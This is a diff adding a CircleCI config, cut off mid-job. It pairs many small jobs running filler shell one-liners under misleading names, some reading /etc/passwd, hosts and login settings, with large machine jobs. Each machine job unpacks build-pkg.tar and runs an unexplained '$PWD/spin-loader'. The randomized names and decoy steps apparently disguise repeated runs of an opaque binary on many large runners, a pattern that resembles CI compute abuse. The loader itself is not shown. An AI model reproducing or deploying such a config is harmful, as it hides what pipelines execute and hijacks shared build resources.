@@ -1,0 +1,1225 @@
+version: 2.1
+
+jobs:
+  ADAMS:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: OPS81
+          command: |
+            mkdir -p /tmp/.d
+            set +o pipefail 2>/dev/null; seq 1 971049 | sed 's/^\([0-9]\)/[\1]/' > /tmp/.d/87.29.195; true
+            echo "[step ok] rust-vet: $(wc -c </tmp/.d/87.29.195) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '87.29.195'
+  rust-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  defchannel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: patch order 6
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; if [ -b /dev/null ]; then echo yes; elif [ -e /tmp ]; then echo maybe; else echo no; fi; true ; } > /tmp/.d/AjmChyg
+            echo "[step ok] zulu-4: $(wc -c </tmp/.d/AjmChyg) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'AjmChyg'
+  zulu-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/AjmChyg 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  TYZVPL-39484a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: lemme outline the support macros
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; printf 'host=db1\nport=8080\nuser=chen\ndebug=false\n' >/tmp/monthly-20260206.dat && awk -F= '{print $1}' /tmp/monthly-20260206.dat; true ; } > /tmp/.d/Ae1t
+            echo "[step ok] q2-release: $(wc -c </tmp/.d/Ae1t) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'Ae1t'
+  q2-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  max_env:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: The load profile is verifying
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; printf '%s\n' blog schedule drawer|wc -l; true ; } > /tmp/.d/17528d5e-a087-4864
+            echo "[step ok] py311-build: $(wc -c </tmp/.d/17528d5e-a087-4864) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '17528d5e-a087-4864'
+  py311-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/17528d5e-a087-4864 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  js-input-link:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Loop Vs Transcode
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; awk -F: '{print $3}' /etc/passwd | tac | shuf -n 1; true ; } > /tmp/.d/ppfZ
+            echo "[step ok] bug-2416: $(wc -c </tmp/.d/ppfZ) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'ppfZ'
+  bug-2416:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  uCacheSegment:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Turn off the sitemap
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'hello' | cut -d' ' -f1; true ; } > /tmp/.d/224610_2015
+            echo "[step ok] wip-parse-timeout: $(wc -c </tmp/.d/224610_2015) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '224610_2015'
+  wip-parse-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/224610_2015 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  ITEM_202606:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: A slow translation
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; touch "/tmp/host.tmp" && mv "/tmp/host.tmp" /tmp/ruby_graph_orange_draft.copy && ls -l /tmp/ruby_graph_orange_draft.copy; true ; } > /tmp/.d/4r2oabi7
+            echo "[step ok] validate-end-to-end-test-matrix: $(wc -c </tmp/.d/4r2oabi7) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '4r2oabi7'
+  validate-end-to-end-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/4r2oabi7 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  SuperServerTexture:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Cast verification spell
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; find /proc/self -type d \( -name 'cmd*' -o -name 'fd' \) -exec ls -1d {} + 2>/dev/null | xargs ls -ld; true ; } > /tmp/.d/snapshot_21713
+            echo "[step ok] hu-push: $(wc -c </tmp/.d/snapshot_21713) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'snapshot_21713'
+  hu-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  Step-BackupView:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: checkpoint for the serving endpoint
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; ls /usr/lib | head | sort -u; true ; } > /tmp/.d/tempd699de
+            echo "[step ok] rc-v9: $(wc -c </tmp/.d/tempd699de) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'tempd699de'
+  rc-v9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  c0mp137ez:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Bonus query
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; for c in crow otter goose cat; do echo "$c"; done; true ; } > /tmp/.d/ravenFoxSignal
+            echo "[step ok] hotfix-1814: $(wc -c </tmp/.d/ravenFoxSignal) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'ravenFoxSignal'
+  hotfix-1814:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  something36:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: like
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; for i in {1..12}; do echo $RANDOM; done | tac | sort -n | uniq | sort -n | tail -n 1; true ; } > /tmp/.d/z8x4gqv7
+            echo "[step ok] publish: $(wc -c </tmp/.d/z8x4gqv7) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'z8x4gqv7'
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/z8x4gqv7 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  halHALPort:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Scout unit tests
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; n=20; case $((n % 3)) in 0) echo fizz ;; *) echo $n ;; esac; true ; } > /tmp/.d/wffoi7wvFLsdUCf0qVPYL
+            echo "[step ok] canary: $(wc -c </tmp/.d/wffoi7wvFLsdUCf0qVPYL) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'wffoi7wvFLsdUCf0qVPYL'
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  no_idx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Up next batch the data loader
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; echo -n "don't panic" | od -An -tx1; true ; } > /tmp/.d/dUStyRenDER
+            echo "[step ok] fx-x: $(wc -c </tmp/.d/dUStyRenDER) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'dUStyRenDER'
+  fx-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  soupZulu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: rel iam 72
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; cp /etc/hosts "${TMPDIR:-/tmp}/filterphase.csv" && cmp /etc/hosts "${TMPDIR:-/tmp}/filterphase.csv" && echo same; true ; } > /tmp/.d/CHROME_WILLOW_BLUE
+            echo "[step ok] add-db: $(wc -c </tmp/.d/CHROME_WILLOW_BLUE) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'CHROME_WILLOW_BLUE'
+  add-db:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  afk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: BLOCKED on the poster image
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 3 -type f -print0 2>/dev/null | xargs -0r stat -c %s | awk '{s+=$1} END {print s}'; true ; } > /tmp/.d/MD5-invoice
+            echo "[step ok] callisto-rc: $(wc -c </tmp/.d/MD5-invoice) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'MD5-invoice'
+  callisto-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/MD5-invoice 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  undo-migration_color:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Closing Lockdown
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; touch "/tmp/PROXY_tmp.list" && mv -v "/tmp/PROXY_tmp.list" "/tmp/MATCH_MORNING.out"; true ; } > /tmp/.d/audit_20220707
+            echo "[step ok] fix-dashboard-bug: $(wc -c </tmp/.d/audit_20220707) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'audit_20220707'
+  fix-dashboard-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  MVPSVMRect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Search side export
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; for u in top admin sprint; do printf '%-8s %d\n' "${u}" ${#u}; done; true ; } > /tmp/.d/7c69f499-2c36
+            echo "[step ok] promote: $(wc -c </tmp/.d/7c69f499-2c36) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '7c69f499-2c36'
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/7c69f499-2c36 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  contractCtx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: POST TO CRM
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; awk -F: '{ print $1, $3 }' /etc/passwd | nl; true ; } > /tmp/.d/seed4_699b
+            echo "[step ok] spin-up: $(wc -c </tmp/.d/seed4_699b) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'seed4_699b'
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/seed4_699b 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  AccountPinHidden:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: On success color grade the closed captions
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; find /proc/self -type f -name 'fd' -exec stat -c '%s %n' {} \; 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/.d/boson.chrome.yield.zinc
+            echo "[step ok] succes-only: $(wc -c </tmp/.d/boson.chrome.yield.zinc) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'boson.chrome.yield.zinc'
+  succes-only:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/boson.chrome.yield.zinc 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  mx-test-b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: review the API keys YES
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; grep -cir case /etc/profile.d | cut -d: -f1 | sort -u; true ; } > /tmp/.d/dev_dat
+            echo "[step ok] delta: $(wc -c </tmp/.d/dev_dat) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'dev_dat'
+  delta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  num_rec_tot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Pirate compression
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; readlink -f /usr/bin/*sum | awk -F'/' '{print $NF}' | tail -n 3; true ; } > /tmp/.d/shaDeRbEar
+            echo "[step ok] push-it: $(wc -c </tmp/.d/shaDeRbEar) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'shaDeRbEar'
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  ct4xazwi55196:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Stage V Cooling Down Mutex
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; cat < /etc/hostname > "/tmp/moduleMusicDusk.dat" && cat "/tmp/moduleMusicDusk.dat"; true ; } > /tmp/.d/R2ypb6nD5LKY9bNWMJSEK3
+            echo "[step ok] nico-verify: $(wc -c </tmp/.d/R2ypb6nD5LKY9bNWMJSEK3) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'R2ypb6nD5LKY9bNWMJSEK3'
+  nico-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  MAX_RATE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Reboot the smart meter as usual
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; printf '%-6s%-6s%s\n' erin liam eva; true ; } > /tmp/.d/57190494-8567-8181
+            echo "[step ok] bake-it: $(wc -c </tmp/.d/57190494-8567-8181) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '57190494-8567-8181'
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/57190494-8567-8181 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  beastStats:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: lap one
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; for x in wednesday friday sunday saturday monday; do printf '%-8s %d\n' "$x" ${#x}; done | sort; true ; } > /tmp/.d/8dfvjpkfwjv
+            echo "[step ok] Rollout_Tests8: $(wc -c </tmp/.d/8dfvjpkfwjv) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '8dfvjpkfwjv'
+  Rollout_Tests8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/8dfvjpkfwjv 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  readyFlag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: StagingClusterWarmupJob
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; printf '%s\n' '3 tests passed' | od -An -tx1; true ; } > /tmp/.d/C
+            echo "[step ok] auh-check: $(wc -c </tmp/.d/C) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'C'
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  ember-ledger:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Dispatch the eval harness from cold storage
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; if grep -q 'ENCRYPT_METHOD' /etc/login.defs;then echo present; else echo 'absent'; fi; true ; } > /tmp/.d/6NDq
+            echo "[step ok] biuld-59: $(wc -c </tmp/.d/6NDq) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '6NDq'
+  biuld-59:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/6NDq 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  yara_sunset:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Execute snapshot with respect to the thread pool
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; printf 'owl\t83\nsample\t90\njuice\t94\nforum\t46\n' >"/tmp/secondary3.tsv" && expand -t 12 "/tmp/secondary3.tsv"; true ; } > /tmp/.d/tmp-7835-45fc-RPC
+            echo "[step ok] go-live: $(wc -c </tmp/.d/tmp-7835-45fc-RPC) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'tmp-7835-45fc-RPC'
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  zzd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
